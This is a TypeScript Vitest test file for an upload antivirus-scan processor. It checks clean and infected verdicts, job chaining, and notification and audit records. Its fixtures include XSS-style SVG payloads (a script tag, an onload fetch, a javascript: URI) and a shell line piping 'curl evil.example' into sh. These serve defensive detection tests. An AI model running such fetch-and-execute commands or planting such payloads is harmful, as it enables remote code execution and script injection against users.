import { beforeEach, describe, expect, it, vi } from 'vitest';
import { AvScanProcessor } from './av-scan.processor';

const scanBufferMock = vi.fn();
vi.mock('./clamd-client', () => ({ scanBuffer: (...args: unknown[]) => scanBufferMock(...args) }));

const sniffMimeMock = vi.fn();
vi.mock('./mime-sniff', () => ({ sniffMime: (...args: unknown[]) => sniffMimeMock(...args) }));

beforeEach(() => {
  scanBufferMock.mockReset();
  sniffMimeMock.mockReset();
});

function selectChain(result: unknown[]) {
  const obj: Record<string, unknown> = {};
  for (const m of ['from', 'where', 'innerJoin', 'limit']) obj[m] = () => obj;
  obj['then'] = (res: (v: unknown) => unknown, rej: (e: unknown) => unknown) =>
    Promise.resolve(result).then(res, rej);
  return obj;
}

function makeProcessor(opts: {
  selectResults?: unknown[][];
  sniffedMime?: string;
  clamdInfected?: boolean;
  clamdSignature?: string;
}) {
  const queue = [...(opts.selectResults ?? [])];
  const updateSet = vi.fn().mockReturnValue({ where: vi.fn().mockResolvedValue(undefined) });
  const insertedValues: unknown[] = [];
  const db = {
    select: vi.fn(() => selectChain(queue.shift() ?? [])),
    update: vi.fn(() => ({ set: updateSet })),
    insert: vi.fn(() => ({
      values: vi.fn((v: unknown) => {
        insertedValues.push(v);
        return Promise.resolve(undefined);
      }),
    })),
  };
  const storage = { getObject: vi.fn().mockResolvedValue(Buffer.from('bytes')) };
  const config = { get: vi.fn().mockReturnValue('localhost') };
  const previewQueue = { add: vi.fn() };
  const textExtractQueue = { add: vi.fn() };
  sniffMimeMock.mockResolvedValue(opts.sniffedMime);
  scanBufferMock.mockResolvedValue({
    infected: opts.clamdInfected ?? false,
    ...(opts.clamdSignature ? { signature: opts.clamdSignature } : {}),
  });
  const processor = new AvScanProcessor(
    db as never,
    storage as never,
    config as never,
    previewQueue as never,
    textExtractQueue as never,
  );
  return { processor, db, updateSet, previewQueue, textExtractQueue, storage, insertedValues };
}

const jobData = { nodeId: 'n1', versionId: 'v1', storageKey: 'k1', mime: 'image/jpeg' };

function withBytes(storage: { getObject: ReturnType<typeof vi.fn> }, text: string) {
  storage.getObject.mockResolvedValue(Buffer.from(text, 'utf8'));
}

describe('AvScanProcessor — clean verdict', () => {
  it('marks clean and chains preview for an image, not text-extract', async () => {
    const { processor, updateSet, previewQueue, textExtractQueue } = makeProcessor({
      selectResults: [[{ currentVersionId: 'v1' }]],
    });
    await processor.process({ data: jobData } as never);
    expect(updateSet).toHaveBeenCalledWith({ avStatus: 'clean' });
    expect(previewQueue.add).toHaveBeenCalledWith('generate', jobData);
    expect(textExtractQueue.add).not.toHaveBeenCalled();
  });

  it('chains text-extract for a PDF, not preview', async () => {
    const pdfJob = { ...jobData, mime: 'application/pdf' };
    const { processor, previewQueue, textExtractQueue } = makeProcessor({
      selectResults: [[{ currentVersionId: 'v1' }]],
    });
    await processor.process({ data: pdfJob } as never);
    expect(textExtractQueue.add).toHaveBeenCalledWith('extract', pdfJob);
    expect(previewQueue.add).not.toHaveBeenCalled();
  });

  it('does not chain anything when a newer version has already superseded this scan', async () => {
    const { processor, previewQueue, textExtractQueue } = makeProcessor({
      selectResults: [[{ currentVersionId: 'v2-newer' }]], // job was for v1
    });
    await processor.process({ data: jobData } as never);
    expect(previewQueue.add).not.toHaveBeenCalled();
    expect(textExtractQueue.add).not.toHaveBeenCalled();
  });
});

describe('AvScanProcessor — infected verdicts', () => {
  it('marks infected on a real ClamAV verdict and notifies, without chaining', async () => {
    const { processor, updateSet, previewQueue, db } = makeProcessor({
      clamdInfected: true,
      clamdSignature: 'Eicar-Test-Signature',
      selectResults: [
        [{ currentVersionId: 'v1' }], // supersede check
        [{ uploadedBy: 'uploader1' }],
        [{ name: 'evil.jpg' }],
        [],
      ],
    });
    await processor.process({ data: jobData } as never);
    expect(updateSet).toHaveBeenCalledWith({ avStatus: 'infected' });
    expect(previewQueue.add).not.toHaveBeenCalled();
    expect(db.insert).toHaveBeenCalled(); // notification + audit rows
  });

  it('marks infected from a dangerous magic-byte signature WITHOUT calling ClamAV', async () => {
    const { processor, updateSet } = makeProcessor({
      sniffedMime: 'application/x-msdownload',
      selectResults: [
        [{ currentVersionId: 'v1' }],
        [{ uploadedBy: 'uploader1' }],
        [{ name: 'x.jpg' }],
        [],
      ],
    });
    await processor.process({ data: jobData } as never);
    expect(updateSet).toHaveBeenCalledWith({ avStatus: 'infected' });
    expect(scanBufferMock).not.toHaveBeenCalled();
  });

  it('marks infected for a real SVG containing an embedded <script> tag, regardless of declared mime', async () => {
    // Declared mime is image/jpeg (jobData default) — content sniffing, not the
    // client-declared Content-Type, must be what catches this.
    const { processor, updateSet, storage } = makeProcessor({
      selectResults: [
        [{ currentVersionId: 'v1' }],
        [{ uploadedBy: 'uploader1' }],
        [{ name: 'icon.svg' }],
        [],
      ],
    });
    withBytes(storage, '<svg><script>alert(1)</script></svg>');
    await processor.process({ data: jobData } as never);
    expect(updateSet).toHaveBeenCalledWith({ avStatus: 'infected' });
    expect(scanBufferMock).not.toHaveBeenCalled();
  });

  it('marks infected for an SVG using an onload= event handler (no literal <script tag)', async () => {
    const { processor, updateSet, storage } = makeProcessor({
      selectResults: [
        [{ currentVersionId: 'v1' }],
        [{ uploadedBy: 'uploader1' }],
        [{ name: 'icon.svg' }],
        [],
      ],
    });
    withBytes(storage, '<svg onload="fetch(1)"></svg>');
    await processor.process({ data: jobData } as never);
    expect(updateSet).toHaveBeenCalledWith({ avStatus: 'infected' });
  });

  it('marks infected for an SVG using a javascript: URI', async () => {
    const { processor, updateSet, storage } = makeProcessor({
      selectResults: [
        [{ currentVersionId: 'v1' }],
        [{ uploadedBy: 'uploader1' }],
        [{ name: 'icon.svg' }],
        [],
      ],
    });
    withBytes(storage, '<svg><a href="javascript:alert(1)">x</a></svg>');
    await processor.process({ data: jobData } as never);
    expect(updateSet).toHaveBeenCalledWith({ avStatus: 'infected' });
  });

  it('does not flag a benign SVG with neither script nor event handlers', async () => {
    const { processor, updateSet, storage } = makeProcessor({
      clamdInfected: false,
      selectResults: [[{ currentVersionId: 'v1' }]],
    });
    withBytes(storage, '<svg><circle cx="5" cy="5" r="4"/></svg>');
    await processor.process({ data: jobData } as never);
    expect(updateSet).toHaveBeenCalledWith({ avStatus: 'clean' });
  });

  it('marks infected for a shell-script shebang, without calling ClamAV', async () => {
    const { processor, updateSet, storage } = makeProcessor({
      selectResults: [
        [{ currentVersionId: 'v1' }],
        [{ uploadedBy: 'uploader1' }],
        [{ name: 'setup' }],
        [],
      ],
    });
    withBytes(storage, '#!/bin/sh\ncurl evil.example | sh\n');
    await processor.process({ data: jobData } as never);
    expect(updateSet).toHaveBeenCalledWith({ avStatus: 'infected' });
    expect(scanBufferMock).not.toHaveBeenCalled();
  });

  it('flags the notification and audit row as superseded when the scanned version is no longer current', async () => {
    const { processor, insertedValues } = makeProcessor({
      clamdInfected: true,
      clamdSignature: 'Some-Signature',
      selectResults: [
        [{ currentVersionId: 'v2-newer' }], // scanned v1, but node now points at v2
        [{ uploadedBy: 'uploader1' }],
        [{ name: 'evil.jpg' }],
        [],
      ],
    });
    await processor.process({ data: jobData } as never);

    // First insert() call is the notifications batch, second is the audit_log row.
    const notificationRows = insertedValues[0] as Array<{ title: string; body: string }>;
    expect(notificationRows[0]!.title).toBe('Infected upload attempt (superseded)');
    expect(notificationRows[0]!.body).toMatch(/already-replaced version/);

    const auditRow = insertedValues[1] as { meta: { superseded: boolean } };
    expect(auditRow.meta.superseded).toBe(true);
  });

  it('does not mark the notification/audit row as superseded when the infected version is still current', async () => {
    const { processor, insertedValues } = makeProcessor({
      clamdInfected: true,
      clamdSignature: 'Some-Signature',
      selectResults: [
        [{ currentVersionId: 'v1' }], // still current
        [{ uploadedBy: 'uploader1' }],
        [{ name: 'evil.jpg' }],
        [],
      ],
    });
    await processor.process({ data: jobData } as never);

    const notificationRows = insertedValues[0] as Array<{ title: string }>;
    expect(notificationRows[0]!.title).toBe('Infected file blocked');

    const auditRow = insertedValues[1] as { meta: { superseded: boolean } };
    expect(auditRow.meta.superseded).toBe(false);
  });
});
